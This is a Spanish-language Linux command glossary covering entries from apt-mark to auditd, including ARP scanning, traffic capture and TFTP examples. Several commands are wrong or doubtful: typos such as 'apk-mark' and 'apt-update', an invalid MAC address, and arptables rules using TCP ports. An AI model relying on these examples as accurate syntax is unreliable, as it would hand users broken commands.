Marca o desmarca un paquete como instalado automáticamente como dependencia por la instalación de otro.  ejemplo, marcar un paquete como de instalación automática o manual o cambiar las selecciones de dpkg como retener, instalar, desinstalar y purgar que son respetadas por apt-get, dselect-upgrade o aptitude.
# apk-mark hold openssl (para que no se actualice el paquete openssl)
# apk-mark unhold openssl (disponible para actualizar)
# apt-mark showhold (ver todos los paquetes que no se actualizaran)
# apt-mark manual ruby (marcar ruby para instalación manual. substituir "manual" por "auto" para volver a instalación autormática)
# apt-mark showremove (los marcados para eliminar)
# apt-mark showmanual (los marcados para instalar manualmente)


apt-mirror
[apache2]. Configurar un repositorio local. Seguidamente se muestra el proceso:
$ mkdir repo (Crear el directorio)
# nano /etc/apt/mirror.list
Añadir al principio la linea del directorio:
	set base_path /home/USER/repo
# apt-mirror (Recargar/actualizar el repositorio)
Crear el enlace para que esté disponible via web:
$ cd /var/www/html
$ ln -s /home/USER/distro/mirror/us.archive.ubunu.com/ubuntu ubuntu
Modificar el sources.list:
# nano /etc/apt/sources.list
Añadir la lineas:
	deb http://192.168.1.2/ubuntu trusty universe
	deb http://192.168.1.2/ubuntu trusty main restricted
	deb http://192.168.1.2/ubuntu trusty-updates main restricted
# apt-update (Actualizar el cliente)


apt-show-source
Muestra información del paquete fuente.
# apt-show-source (de todos los instalados)
# apt-show-source -p vim (del especificado)


apt-show-versions
Analiza las versiones instaladas de paquetes y si existen actualizaciones.
$ apt-show-versions (mostrará la versión de todos los paquetes instalados)
$ apt-show-versions thunderbird (La version instalada de un paquete)
$ apt-show-versions -a thunderbird (Todas las versiones disponibles de un paquete)
$ apt-show-versions -u (sólo mostrar los paquetes que tienen nueva version)


apt-sortpkgs
Herramienta para ordenar los ficheros del índice de paquetes.
# apt-sortpkgs -s /var/lib/dpkg/available (orden por el campo de índice de fuentes)


apt-src
Herramienta en sistemas basados en Debian diseñada para trabajar con el código fuente de los paquetes. A diferencia de apt-get, que instala paquetes binarios precompilados, apt-src permite descargar, compilar, instalar, y administrar paquetes a nivel de código fuente. Para que apt-src funcione correctamente, han de tenese habilitados los repositorios de código fuente en el archivo /etc/apt/sources.list [deb-src].
# apt-src install vim (descargará el código fuente del paquete al directorio de trabajo actual, en lugar de instalar el paquete binario)
# apt-src update vim (actualizar el código fuente a la última versión disponible de un paquete ya descargado)
# apt-src build vim  (compilar el código fuente descargado)
# apt-src remove vim (desinstalar un paquete compilado usando apt-src)
# apt-src list (listar paquetes instalados mediante apt-src)
# apt-src diff (Este comando creará un archivo de parche con las diferencias entre la versión original y los cambios realizados por ti)


apt-xapian-index
Herramienta que se utiliza en sistemas Debian y derivados para crear y mantener un índice de información sobre los paquetes disponibles en /var/lib/apt-xapian-index, y axi-cache, una herramienta de búsqueda que utiliza el índice update-apt-xapian-index y permite instalar complementos para indexar todo tipo de información adicional, como etiquetas Debtags, información de popcon, calificaciones de paquetes y cualquier otra cosa que encaje.
# update-apt-xapian-index (actualizar el índice)
# axi-cache info (Imprimir información sobre el entorno apt-xapian-index)
# axi-cache search vim (buscar paquetes relacionados con "vim")
# axi-cache show gimp (mostrar toda la información del paquete)
# axi-cache depends gedit (mostrar las dependencias y paquetes recomendados del comando especificado)
# axi-cache policy emacs gedit vim (información de los tres comandos especificados)


aptfs
Herramienta basada en FUSE que permite explorar los paquetes fuente de Debian como si fueran archivos en un sistema de archivos. Esto facilita el acceso a los archivos fuente de los paquetes directamente desde la estructura de directorios, sin necesidad de descargarlos y extraerlos manualmente.
# mkdir /mnt/aptfs (crear el directorio)
# aptfs /mnt/aptfs (montar el sistema de archivos aptfs en el directorio /mnt/aptfs, permitiendo navegar por los paquetes fuente)
        $ cd /mnt/aptfs
        $ ls (lista de directorios, cada uno representando un paquete disponible)
        $ cd /mnt/aptfs/coreutils
        $ ls (ver todos los archivos fuente del paquete coreutils disponibles en ese directorio)
        $ find /mnt/aptfs/coreutils -name "archivo.c" (buscar dentro del sistema de archivos para encontrar el archivo archivo.c)
# umount /mnt/aptfs (desmontar el sistema de archivos aptfs)


aptly
Gestión de repositorios de paquetes Debian en local.
# aptly repo create -distribution=bullseye -component=main mi-repo (crea un repositorio local mi-repo con la distribución bullseye y el componente main)
# aptly repo add mi-repo /paquete.deb (añadir paquetes .deb al repositorio mi-repo)
# aptly publish repo -architectures=amd64 i-repo (hace accesible un servidor web local en la ruta /aptly/public)
# aptly mirror create -architectures=amd64 debian-mirror http://deb.debian.org/debian bullseye main (sincronizar aptly con repositorios externos, por ejemplo, el repositorio principal de Debian)
# aptly mirror update debian-mirror (actualizar un espejo creado previamente)
# aptly repo remove mi-repo nombre-del-paquete (eliminar un paquete específico del repositorio)
# aptly snapshot export tar mi-repo /exportada/mi-repo.tar (exportar un repositorio a un archivo tar para distribuirlo)


aptly-publisher
Herramienta que complementa a aptly para automatizar la publicación y organización de repositorios Debian en entornos de producción.  Primero configurar un archivo de configuración básico para definir cómo se gestionarán los repositorios.
# nano config.yml
Y añadir las lineas:
         rootDir: /path/to/aptly/root
         publishEndpoints:
            myRepo:
                distribution: bullseye
                components:
                      - main
                architectures:
                      - amd64
         cleanupOldPublications: true
Este archivo define un punto de publicación para bullseye con el componente main y arquitectura amd64. La última linea es para eliminar publicaciones antiguas automaticamente.
# aptly-publisher -config=config.yml publish (publicar los paquetes del repositorio o actualizar un repositorio publicado para reflejar nuevos cambios)
Si se pretende publicar múltiples repositorios, en el archivo config.yml incluir las siguientes lineas:
      publishEndpoints:
        repo1:
                distribution: bullseye
                components: [main]
                architectures: [amd64]
        repo2:
                distribution: buster
                components: [main]
                architectures: [i386]
Con esta configuración, se puede gestionar y publicar los dos repositorios [repo1 y repo2] con un solo comando:
# aptly-publisher -config=config.yml publish


ar
Crea, modifica y extrae archivos.
$ ar crv libfoo.a bill.o fred.o (Añade librerias objeto a un archivo de librería estática)
$ ar vx paquete.deb (extrae un .deb convirtiendolo en un tar.gz)
$ ar x finalterm_0.1-0~64~saucy1_amd64.deb (Extraer los 3 archivos de un paquete deb)
$ ar p finalterm_0.1-0~64~saucy1_amd64.deb data.tar.gz | tar xz (Extraer y descomprimir uno de los archivos de un paquete deb)
$ ar t paquete.deb (ver los componentes del paquete, incluidas las secciones de firma)


arcanist
Herramienta para interactuar  con Phabricator, colección de aplicaciones web para el desarrollo de software, que desde el 1 de junio de 2021, ya no recibe mantenimiento activo. La herramienta permite realizar operaciones relacionadas con el flujo de trabajo de desarrollo de software, como enviar revisiones de código, actualizar revisiones y ejecutar pruebas.
$ arc diff (escanear los cambios en una rama actual y generar una revisión de código, que se sube al servidor de Phabricator y abrirá una interfaz interactiva para agregar detalles, etiquetas, etc)
$ arc diff --update D1234 (con una revisión creada y se desea actualizar con nuevos cambios adicionales a esa revisión específica)
$ arc patch D1234 (descarga y aplica los cambios de la revisión indicada (D1234) al repositorio local)
$ arc unit (ejecuta conjunto de pruebas especificado en la configuración de Phabricator para asegurarse de que los cambios no rompan nada antes de enviarlos)
$ arc lint (analiza el código y muestra recomendaciones de estilo, errores potenciales y advertencias)
$ arc help diff (mostrar auyda para un comando especifico)


arch
Muestra la arquitectura del pc.
$ arch


arch-install-scripts
Están diseñados para facilitar la instalación de sistemas Arch Linux, pero también pueden resultar útiles en sistemas Debian para gestionar particiones, formatear discos, o preparar sistemas base. Contiene los paquetes: arch-chroot,  genfstab y pacstrap
# pacstrap /mnt base (instala el sistema base de Arch Linux en /mnt)
# mount-chroot /mnt (monta las particiones y dispositivos necesarios en /mnt)
# genfstab -U /mnt >> /mnt/etc/fstab (detecta automáticamente las particiones montadas y las configura en el archivo fstab del sistema en /mnt)
# arch-chroot /mnt (permite operar dentro del entorno chroot de manera similar al comando chroot de Debian)
# arch-chroot /mnt pacman -S vim (instala vim en el entorno de Arch)


arch-test
Detectar las arquitecturas soportadas por un pc.
$ arch-test


archalien
Convierte paquetes .deb en paquetes Archlinux. Descarga de <https://github.com/Asher256/archalien>
$ python archalien.py arandr_0.1.9-1_all.deb
El resultado es un paquete con el nombre arandr-0.1.9-1.pkg.tar.gz que puede instalarse en Arch Linux con:
# pacman -U arandr-0.1.9-1.pkg.tar.gz


archivemount
Sistema de archivos basado en FUSE [Filesystem in Userspace] que permite montar archivos comprimidos tales como .zip, .tar, .rar, etc. como si fueran sistemas de archivos normales pudiendo acceder a su contenido sin descomprimirlos. Su propósito es montar archivos en un punto de montaje desde donde se puedan leer o escribir como en cualquier otro sistema de archivos.
# archivemount archivo.zip mnt/ (montar un archivo .zip en la carpeta /mnt)
# archivemount -o ro archivo.tar.gz mnt/ (montar un .tar.gz de solo lectura)
# fusermount -u mnt/ (desmontar un archivo como: umount mnt/)
# archivemount archivo.iso mnt/ (montar una .iso)
# archivemount -o attr_timeout=60 archivo.zip mnt/ (mantener en caché la información de los archivos, muy útil en archivos grandes)


arecord
[alsa-utils]. Grabación de audio. Graba directamente de la tarjeta de sonido sin tener conectado los altavoces ni micro.
$ arecord -l (Listado de dispositivos)
$ arecord -f cd -d 10 --device="hw:0,0" test.wav (seleccionar un dispositivo de entrada de audio de la lista, grabar un audio de 10 segundos y guardar en test.wav)
$ arecord archivo.mp3 (Modo básico)
$ arecord -t wav -f cd -d 15 archivo.wav (Tipo wav, formato cd, duración de la grabación 15 segundos y nombre con el que se guardará)


arecordmidi
[alsa-utils]. Graba un archivo MIDI estándar desde uno o más puertos del secuenciador ALSA.
$ arecordmidi -l (lista de posibles puertos)
$ arecordmidi -p 14:0 archivo.mid


argus
Conjunto de herramientas cliente-servidor, para el análisis de tráfico de red.
# argus-i eth0 -w salida.arg  (capturar en tiempo real todo el trafico de red)
# ra -L0 -nr salida.arg (Leer el fichero generado)
# argus -mJRU 1024 -r captura.pcap -w salida.arg (convertir un fichero pcap [wireshark, tshark, tcpdump...] a formato argus)
# ra -a -c -L0 -nr skipe.arg - host IP (Filtrar una sola IP)


arithmetic
[bsdgames]. Resolución de problemas matemáticos muy simples.
$ arithmetic -o +- -r 30 (Usando sumas y restas y del 0 al 30)
$ arithmetic -o x/ (con multiplicaciones y divisiones del 0 al 10 [por defecto])


arj
Compresor/escompresor de archivos.
$ arj -a archivo.arj ficheros (Comprimir)
$ arj -x archivo.arj (Descomprimir. Tambien unarj archivo.arj)
$ arj -v archivo.arj (Ver contenido)


arm
[tor-arm]. Herramienta que permite monitorizar el comportamiento y los eventos que usan la red tor [tor-browser, vidalia....]. Funciona de forma similar al comando top. Precisa tener al archivo ~/.arm/armrc un ejemplo del cual puede descargarse de <https://raw.githubusercontent.com/katmagic/arm/master/armrc.sample> y para que no salga la nota "Connection refused. Is the ControlPort enabled?" habilitar dicho puerto en:
# nano /etc/tor/torrc
Descomentado la linea:
	ControlPort 9051
Con el puerto usado por arm por defecto y reiniciar la red tor.
# /etc/init.d/tor restart
# arm (arrancar la aplicación)
Las teclas de control se muestran en la parte superior y son:
	m (Muestra el menú)
	p (Pausar)
	h (Ayuda)
	q (Salir)
	flechas derecha e izquierda (Va mostrando los distintos informes)
En el archivo de configuración ya está especificado el puerto, el host y la ubicación del archivo por defecto, pero si ha de especificarse:
# arm -c /home/usuario/.arm/armrc -i 127.0.0.1:9051


arp
Supervisa la tabla ip y MAC.
# arp -n
# arp -s IP MAC (establecer una MAC estática a una IP)
# arp -d IP (eliminar una ip de la entrada arp)


arp-fingerprint
Intenta determinar el sistema operativo.
# arp-fingerprint -o "-I eth1" 192.168.1.10
# arp-fingerprint -v 192.168.1.5 (Mostrando más información)


arp-scan
Escanea en una red las direcciones IP y las MAC.
# arp-scan -I eth0 192.168.2.0/16
# arp-scan -l -I eth1
	Nota.- En el primer ejemplo es una i mayúscula. En el segundo la primera opción la “ele” minúscula y la segunda la i mayúscula


arpalert
Prevenir conexiones no autorizadas en la red local. Colocar las MAC, las ips de las máquinas autorizadas y la interfice:
# /etc/arpalert/maclist.allow
	F4:CE:26:43:E8:C9       192.168.1.1    eth0
	00:21:97:23:9e:91       192.168.1.14   eth0
	19:F0:8G:66:10:E5       192.168.1.26   eth0
Reiniciar el servicio:
# /etc/init.d/arpalert restart


arping
Enviar solicitud ARP a una ip de la red.
# arping -I eth0 IP
# arping -D -I eth1 192.168.1.15; echo $? (Detectar ips duplicadas)


arpon
Herramienta para securizar ARP en nuestra red, un demonio que ha de instalarse en cada equipo que interviene en la conexión. Previamente especificar en el archivo de configuración las ips y su correspondiente MAC:
# nano  /etc/arpon.conf
	192.168.1.1 32:F4:66:C8:41:12
	192.168.1.130 00:21:97:23:9e:91
	192.168.1.25 F4:CE:26:43:E8:C9
Colocando la ip de las máquinas y su MAC y la ip y MAC del router. La interface  la colocamos en:
# nano /etc/dafault/arpon
Y añadir:
	INTERFACES="enp1s0"
O la que proceda (eth0, eth1...)
# tail -f /var/log/arpon/arpon.log (ver la actividad de la herramienta)


arptables
Herramienta analoga a iptables [ver] que se utiliza para configurar y mantener las tablas de reglas ARP en el kernel Linux y permite controlar el tráfico ARP que envía, recibe o passa por la máquina. Incluye las aplicaciones arptables-legacy, arptables-legacy-restore y arptables-legacy-save. La herramienta consta de una sola tabla [filter] y dos cadenas: INPUT y OUTPUT y las acciones básicas se reducen a ACCEPT, DROP y RETURN para el origen del paquete [-s] o su destino [-d]. Ejemplo:
# arptables -A INPUT -s 192.168.1.10 -j DROP (bloquear las entradas de la ip especificada)
# arptables -A OUTPUT -d 192.168.1.10 -j DROP (bloquear las salidas de la ip especificada)
Tambien puede especificarse la interfaz [-i] si tenemos varias:
# arptables -A INPUT -i eth0 -s 192.168.1.10 -j DROP (las que salen por eth0)
# arptables -A INPUT -o eth0 -d 192.168.1.10 -j DROP (las que entran por eth0)
# arptables -A INPUT -i eth0 -p tcp --dport 22 -j DROP (bloquear entradas por el puerto 22)
# arptables --list -n (enumerar las reglas activas)
# arptables -A INPUT --source-mac 00:11:22:33:44:55 -j DROP (bloquear una MAC concreta)


arpwatch
Ayuda a monitorear la actividad del tráfico en la red en lo que respecta al cambio de IP con su MAC asociada y mantiene una base de datos de dichos emparejamientos junto con una marca de tiempo, por lo que es posible comprobar cuando apareció actividad en el nuevo emparejamiento. Archivos principales: /var/arpwatch/arp.dat, base de datos donde se registran las direcciones IP/MAC y /var/log/messages, registro donde arpwatch escribe cualquier cambio o actividad inusual en IP/MAC [en lagunas distros en /var/log/syslog].
# arpwatch -i eth0 (mostrar una interfaz concreta)
Nota.- Analizar los logs con el clásico: tail -f /var/log/messages
1-
Si queremos que nos mandoe un correo:
# nano /etc/arpwatch.conf
Y añadir la linea:
	eth0 -a -n 192.168.1.0/24 -m usuario@url.com


arrays
También llamado vector, arreglo o alineación es un conjunto o agrupación de variables del mismo tipo cuyo acceso se realiza por índices. El primer indice de una array es el 0.
Ejemplos de uso:
1.-
	#!/bin/bash
	array=($(ls -1))
	echo "escoge el archivo..."
	declare -p array | sed -e 's/ /\n/g'
	read MOD
	echo "Has escogido ${array[MOD]}"
2.-
Recorrer un array:
	fruta[1]=manzana
	fruta[2]=pera
	fruta[3]=limón
	fruta[4]=higo
	for i in "${fruta[@]}"
	  do
		echo $i;
	  done
3.-
Un array puede establecerse con "declare". Tiene la misma salida:
	declare -a distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy')
	echo ${distro[@]}
Que el siguiente:
	distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy')
	echo ${distro[@]}
4.-
Copiar un array:
	distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy')
	opciones=("${distro[@]}")
	echo ${opciones[@]}
5.-
Añadir un array a continuación de otro y mostrar el número de elementos:
	distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy');
	Shell=('bash' 'csh' 'jsh' 'rsh' 'ksh');
	UnixShell=("${distro[@]}" "${Shell[@]}")
	echo ${UnixShell[@]}
	echo ${#UnixShell[@]}
6.-
Algunas opciones con arrays:
	echo ${#array[@]} (Mostrar la cantidad de elementos del array)
	echo ${#array[3]} (Mostrar el tamaño del elemento 3)
	echo ${!array[@]} (Mostrar los elementos que no son nulos)
	echo ${fruta[@]/pera/fresa} (En el ejemplo 2 substituir "pera" por "fresa")
	fruta=("${fruta[@]}" "melón") (Añadir un elemento)
	unset fruta[2] (Borrar un elemento)
	unset fruta (Borra todo el array)


ascii
[American Standard Code for Information Interchange, Código Estadounidense Estándar para el Intercambio de Información]. Código de caracteres de 7 bits en el que cada bit representa un carácter único basado en el alfabeto latino tal como se usa en inglés moderno. Este código nació a partir de reordenar y expandir el conjunto de símbolos y caracteres ya utilizados en aquel momento en telegrafía. Los caracteres se pueden escribir con la combinación de teclas Ctrl-Shift-u código_ascci_hexadecimal intro.
$ man ascii (muestra la tabla de caracteres)
$ ¾ (ctrl-shift-u be intro)
$ æ (ctrl-shift-u e6 intro)
Una curiosidad de ascii:
$ ssh -o StrictHostKeyChecking=no watch.ascii.theater


ascii2binary
lee la entrada que consiste en números ascii o hexadecimales separados por espacios y produce como salida los equivalentes binarios. Incluye el comando binary2ascii que lee la entrada que consiste en números binarios y los convierte a su representación ascii o hexadecimal.
$ echo "65 66 67" | ascii2binary (65 66 67 son los valores ASCII de las letras A, B y C)
$ echo "41 42 43" | ascii2binary -b h (41 42 43 representan en hexadecimal las letras A, B y C)
$ echo "72 101 108 108 111" | ascii2binary (toma la secuencia de números ASCII de la palabra "Hello")
$ echo "150 151" | ascii2binary -b 8 (que cada número ASCII se convierta a una salida binaria de 8 bits)


asciiart
Convertir imágenes en arte ASCII.
$ asciiart -i imagen.jpg -o salida.txt (tomar una imagen, convertirla a ascii y guardarla en un archivo)
$ asciiart -i imagen.jpg -o salida.txt -w 100 (establece el ancho de la imagen ASCII en 100 caracteres)
$ asciiart -i imagen.jpg -o salida.txt --invert (invierte los colores)
$ asciiart -i imagen.jpg -o salida.txt --grayscale (se genera utilizando tonos de gris)
$ asciiart -i imagen.jpg -o salida.txt -c " .:-=+*%@#" (especifica una lista de caracteres a usar, de menos a más densidad)


asciidoc
Es un formato de documento de texto para escribir artículos, libros, manuales y páginas de manual de UNIX. Los archivos AsciiDoc se pueden traducir a HTML [con o sin hojas de estilo], DocBook [artículos, libros y documentos] y LinuxDoc usando el comando asciidoc. Se escribe un documento AsciiDoc de la misma manera que se escribiría un documento de texto normal, no hay etiquetas de marcado ni notaciones de formato extrañas. Los archivos AsciiDoc están diseñados para verse, editarse e imprimirse directamente o traducirse a otros formatos de presentación.
$ asciidoc file.txt
$ asciidoc --help syntax (muestra todas las formas sintacticas que pueden usarse)
$ asciidoc -b html5 -d manpage asciidoc.1.txt  (Genera página man usando html5)


ascii-image-converter
Convertir imagenes de formatos estandard [png, jpg, jprg...] a imagen ascii.
$ ascii-image-converter imagen.png > imagen.txt (forma básica y guardarla en imagen.txt)
$ ascii-image-converter imagen.png -Cb -s . (en color, en código braille y guardar la imagen en el presente directorio con el nombre por defecto image-ascii-art.png)
$ ascii-image-converter --formats (formatos soportados)


asciinema
Grabación de la terminal. Requiere registro en asciinema.org. Visualizar videos de otros usuarios en <https://asciinema.org/browse/featured>
$ asciinema auth (Para utentificarse en asciinema.org)
$ asciinema rec (Empezar la grabación. "Ctrl -d" o "exit" para matar el proceso. Al terminar preguntará si queremos subir el video a nuestro perfil)
$ asciinema -t nmap rec (Colocando un título)


asciiview
Visualizar imágenes (png, jpg, gif...) en consola
$ asciiview imagen.jpg


aseqdump
Mostrar los eventos recibidos en un puerto secuenciador ALSA.
$ aseqdump -l (listar puestos)
$ aseqdump -p 14:0 (mostrar los de un puerto)


asoundconf
Averiguar las tarjetas de sonido instaladas
# asoundconf list  (listarlas)
# asoundconf set-default-card 1  (activar la especificada en el comando anterior)
# asoundconf reset-default-card  (volver a la configuración por defecto)


aspell
[aspell-ca aspell-es]. Diccionarios para aplicaciones
# aspell-autobuildhash (Informar a aspell nuevas entradas de diccionarios)
# aspell dicts (listar los diccionarios instalados)
$ aspell-import (buscará viejos diccionarios personales y los importará. Buscará tanto diccionarios Ispell como Aspell)
$ aspell --lang=ca dump master > lista.txt  (crea una lista de palabras del idioma especificado)


at
Ejecuta aplicaciones o scripts a una hora especificada.
$ at 20:00   (se entra en el promt de at para programar una tarea. Xtrl + d para salir)
$ atq  (muestra el listado de tareas programadas)
$ at -f archivo (Lee las tareas a realizar desde un achivo)
$ atrm número (elimina la especificada en “número”)
$ at 8:30 <<< "xmms2 play"   (montar una alarma con at y xmms2)
$ echo "xmms2 play" | at 6:00  (lo mismo)
$ echo "mplayer The_Best.mp3" | at now + 15min (Relacionado. Reproducir con mplayer un mp3 de aquí a 15 minutos)
	Nota.- Si la configuración de comandos o el script intentan visualizar información, la salida de datos será enviada vía correo electrónico al usuario, pudiendo generar un "Subject: Delivery Status Notification (Failure)" si el correo no está bien configurado


aterm
Emulador de terminal
$ aterm -e links2 http://google.es
Opciones:
	-geometry 100x15 (Especificando medidas)
	-pixmap imagen (Con una imagen de fondo)
	-bg red  (color de fondo)
	-fg white (color de fuente)
	-cr blue (Color del cursor)


atfs
Sistema de almacenamiento de archivos que permite gestionar múltiples versiones. Lo hace sin necesidad de realizar modificaciones en el núcleo y sin imponer ninguna restricción a las aplicaciones del sistema de archivos existentes. Es parte de hapeTools, un sistema de gestión de configuración de software.
$ vfcreate nombre_archivo (crea una primera versión del archivo en el sistema de versiones)
$ vflist nombre_archivo (muestra todas las versiones del archivo en el repositorio ATFS)
$ vfget nombre_archivo -r numero_versión -o nombre_archivo_salida (archivo y versión que se desea recuperar y nombre que tendrá el archivo descargado)
$ vfdelete nombre_archivo -r numero_versión (elimina la versión específica indicada por numero_versión)
$ vfdiff nombre_archivo -r version1 -R version2 (ver las diferencias entre dos versiones de un archivo)
$ vflock nombre_archivo (bloquear una versión de un archivo)
$ vfunlock nombre_archivo (desbloquear un archivo)


atftp
Implementación del protocolo trivial de transferencia de archivos [Trivial File Transfer Protocol (TFTP)] que se usa para transferir archivos entre sistemas. Este protocolo es común en redes locales y útil para tareas de configuración de red y despliegue de sistemas operativos en equipos sin disco.
$ atftp --get --remote-file config.txt --local-file config_local.txt 192.168.1.10 (conectar con el servidor 192.168.1.10 y descargar config.txt, guardándolo como config_local.txt en el sistema local)
$ atftp --put --remote-file backup.cfg --local-file backup.cfg 192.168.1.10 (carga el archivo backup.cfg desde tu equipo al servidor 192.168.1.10)
$ atftp 192.168.1.10 (conectarse al servidor y abrir una interfaz interactiva)
  tftp> get archivo.txt (descargar archivo)
  tftp> put nuevo_archivo.cfg (cargar archivo)
  tftp> quit (salir)
$ atftp --get --mode octet --remote-file firmware.bin --local-file firmware_local.bin 192.168.1.10 (--mode octet asegura la transferencia en modo binario)
$ atftp --get --remote-file config.txt --local-file config_local.txt --port 8069 192.168.1.10 (descargar config.txt desde el puerto 8069 en el servidor 192.168.1.10)


atheme-services
Conjunto de servicios de IRC que facilita la gestión de redes al ofrecer herramientas para la administración de canales, usuarios y permisos. El núcleo de atheme-services es minimalista y solo ofrece la funcionalidad básica.
$ atheme-services (iniciar y cargar la configuración predeterminada del archivo atheme.conf)
$ atheme-console (conectar a la consola de administración)
  /msg NickServ REGISTER <contraseña> <email> (solicitud al servicio NickServ para registrar un nuevo usuario con la contraseña y correo especificados)
  /msg ChanServ REGISTER #canal (registra #canal y lo asocia con el usuario, quien podrá administrar los permisos y configuraciones del canal)
  /msg ChanServ FLAGS #canal <usuario> +o (da al usuario permisos de operador [+o] en #canal)
$ atheme-console set password <usuario> <nueva-contraseña> (cambia la contraseña del usuario)
$ atheme-console suspend <usuario> "Razón de la suspensión" (suspender la cuenta de un usuario y la razón)
$ atheme-checkconf (revisar el archivo de configuración atheme.conf en busca de errores)
$ atheme-services restart (reiniciar servicios)


atool
Herramienta versátil para gestionar archivos comprimidos en diferentes formatos [zip, tar, gzip, etc...]. Incluye los comandos apack [crear archivos comprimidos]), als [enumerar archivos en archivos comprimidos] y acat [extraer archivos a la salida estándar].
$ apack archivo.zip archivo.txt (crear archivo.zip con el archivo archivo.txt)
$ apack archivo.tar.gz file1.txt file2.txt (crear un comprimido con varios archivos)
$ apack directorio.tar.gz ~/Documentos (comprimir todo el directorio Documentos)
$ als archivo.zip (listar el contenido de un .zip)
$ atool -x archivo.zip (extrae todos los archivos del .zip en el directorio actual)
$ atool -x archivo.zip -d /Documentos/emacs/ (los extrae en un directorio especifico)
$ atool -x archivo.7z (extraer un archivo .7z)
$ atool -xf archivo.zip (forzar la extracción a un directorio sin sobreescribir)
$ acat archivo.tar.gz (mostrar el contenido de un archivo comprimido sin extraer)
$ acat archivo.zip documento.txt (ver un archivo específico dentro de un archivo comprimido)
$ apack ~/Comprimidos/archivo.zip documento.txt (comprimir y mover directamente el archivo comprimido a una ubicación específica)
$ als archivo.tar.gz (listar el contenido)
$ als archivo (identificar automáticamente el formato del archivo sin necesidad de especificarlo y listar el contenido)


atop
Monitor interactivo para ver la carga del sistema. Muestra la ocupación de los recursos de la CPU, memoria, disco y red. Incluye los ejecutables atopcat, atopconvert, atopsar y atopacctd. Pulsando las mismas letras en la pantalla de atop activa, se modifican los mismos parámetros de visualización.
$ atop -s 5 -a -c (cada 5 segundos actualización. Por defecto 10 y solo los procesos activos y uno por linea)
$ atop -u -m (del usuario que lo lanza y mostrando memoria)


atopsar
Elabora informes de las estadísticas del sistema. Ver entrada sar.
$ atopsar -w (Informe sobre el tráfico de red IP)
$ atopsar -m -r 20231118 -b 09:00 -e 10:30 (de la memoria, guardado en el archivo "fecha" [YYYYMMDD] empezando a las 9 horas y terminando a las 10,30)
$ atopsar -A -r 20231118 (mostrando todo el reporte)
$ atopsar -t 30 5 (informe sobre el tráfico de red, 5 muestras con un intervalo de 30 segundos)


attr
Un conjunto de herramientas para manipular atributos extendidos en objetos del sistema de archivos. Está diseñado para ser compatible con la herramienta SGI IRIX del mismo nombre.
$ getfattr /ruta/al/objeto (mostrará todos los atributos y sus valores asociados al objeto especificado)
$ setfattr -n user.myattribute -v "mi valor" /home/user/archivo.txt (establecer un nuevo atributo)
$ setfattr -n ombre.del.atributo -v nueo_valor /ruta/al/objetto (modificar un atributo existente)
$ rmfattr -n ombre.del.atributo /ruta/al/objetto (eliminar un atributo)
$ attr -C /ruta/al/objetto (mostrará todos los atributos del objeto)
$ attr -E nombre.del.atributo /ruta/al/objetto (establecerá o modificará el atributo especificado)
$ attr -R nombre.del.atributo /ruta/al/objetto (eliminará el atributo especificado)


audiofile-tools
Utilidad para trabajar con archivos de audio [actualmente AIFF, AIFF-C, WAVE, NeXT/Sun, BICS y datos sin procesar]. Este paquete contiene las herramientas sfinfo y sfconvert.
$ sfinfo archivo.wav  (muestra información de formato, canales y duración de un archivo de audio)
$ sfinfo -v archivo.wav (muestra información más extendida como los metadatos del archivo)
$ sfconvert entrada.wav salida.mp3 (convertir un .wav a .mp3)
$ sfconvert entrada.wav salida.wav -r 48000 (cambiar la tasa de muestreo a 48 kHz)
$ sfconvert entrada.wav salida_mono.wav -c 1 (convertir un archivo a mono)
$ sfconvert entrada.wav salida_8bit.wav -b 8 (cambiar el formato de datos a 8 bits)
$ sfconvert entrada.wav salida.mp3 -c 1 -r 22050 (convertir un archivo estéreo WAV a mono MP3 con una tasa de muestreo de 22.05 kHz)
script para convertir todos los archivos WAV de un directorio a MP3:
       for file in *.wav; do
         sfconvert "$file" "${file%.wav}.mp3"
       done


audiolink
es una herramienta que facilita y agiliza la búsqueda de música en su medio de almacenamiento local. Sus búsquedas pueden incluir una variedad de criterios, como artistas masculinos, artistas femeninas, banda, género, etc. Funciona con archivos MP3 y Ogg Vorbis y crea una base de datos MySQL en la que almacena la información sobre los archivos de música. Crea enlaces simbólicos a los archivos de música reales en función de los resultados de la búsqueda. Puede buscar por múltiples campos, como artista, banda, compositor, letrista, etc.
$ audiolink search /musica (buscar archivos de música en el directorio especificado)
$ audiolink search --title "rock" (busca canciones cuyo título incluya "rock")
$ audiolink search --artist "The Beatles" (encuentra todas las canciones de "The Beatles" en el almacenamiento local)
$ audiolink search --type mp3 /musica (busca solo archivos con extensión .mp3 en el directorio especificado)
$ audiolink play --title "Imagine" (reproduciría la canción "Imagine" si está disponible en los resultados)
$ audiolink info /musica/cancion.mp3 (muestra detalles de los metadatos de la canción seleccionada)


audiotools
Conjunto de herramientas quue se utilizan para trabajar con CDs de audio como extracción de CD, conversión de pistas de un formato de audio a otro, cambio de nombre y etiquetado de pistas, identificación de pistas, grabación de CD a partir de pistas y más. Incluye varios comandos: audiotools-config, cdda2track, cddainfo, cddaplay, coverdump, covertag, coverview, track2cdda, track2track, trackcat. trackcmp, trackinfo, tracklength, tracklint, trackplay, trackrename, tracksplit, tracktag y trackverify.
$ cdda2track --device /dev/cdrom --format wav --output-dir ./output (extrae todas las pistas del CD ubicado en /dev/cdrom y las guarda como archivos .wav en el directorio ./output)
$ cddainfo --device /dev/cdrom (información sobre las pistas del CD en el dispositivo especificado)
$ cddaplay --device /dev/cdrom --track 1 (reproduce la primera pista del CD en el dispositivo /dev/cdrom)
$ cddainfo --list --device /dev/cdrom (lista numerada de las pistas disponibles en el CD)
$ cdda2track --device /dev/cdrom --track 3 --format flac --output ./track3.flac (extrae solo la pista 3 del CD y la guarda en formato .flac como track3.flac)
$ cdda2track --device /dev/cdrom --format mp3 --bitrate 192k --output-dir ./mp3_output (convierte todas las pistas del CD a archivos .mp3 con un bitrate de 192 kbps y los guarda en el directorio ./mp3_output)
$ cddaplay --device /dev/cdrom --all (reproduce todas las pistas del CD en orden)
$ cddaplay --device /dev/cdrom --volume 75 (ajusta el volumen al 75% mientras reproduce)
Para explorar más opciones añadir al comando específico la opción --help:
$ coverdump --help


auditd
[audit]. Demonio que monitoriza accesos al sistema y modificación de ficheros y carpetas. Sin ninguna configuración adicional registrará en /var/log/audit/audit.log toda la actividad del sistema [ssh, vnc, cron...]. Si queremos controlar un directorio:
